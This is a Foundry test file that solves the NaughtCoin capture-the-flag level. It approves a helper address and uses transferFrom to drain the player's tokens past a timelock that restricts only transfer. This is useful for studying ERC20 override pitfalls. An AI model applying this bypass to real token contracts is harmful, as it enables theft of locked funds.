// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/15-NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public target;
    address player = vm.addr(1);
    address helper = vm.addr(2);

    function setUp() public {
        target = new NaughtCoin(player);

        vm.label(address(target), "Challenge");
        vm.label(address(player), "Player");
    }

    function testNaughtCoin() public {
        vm.startPrank(address(player));
        target.approve(helper, target.balanceOf(player));
        vm.stopPrank();

        vm.startPrank(address(helper));
        target.transferFrom(player, helper, target.balanceOf(player));

        assertTrue(target.balanceOf(player) == 0);
    }
}
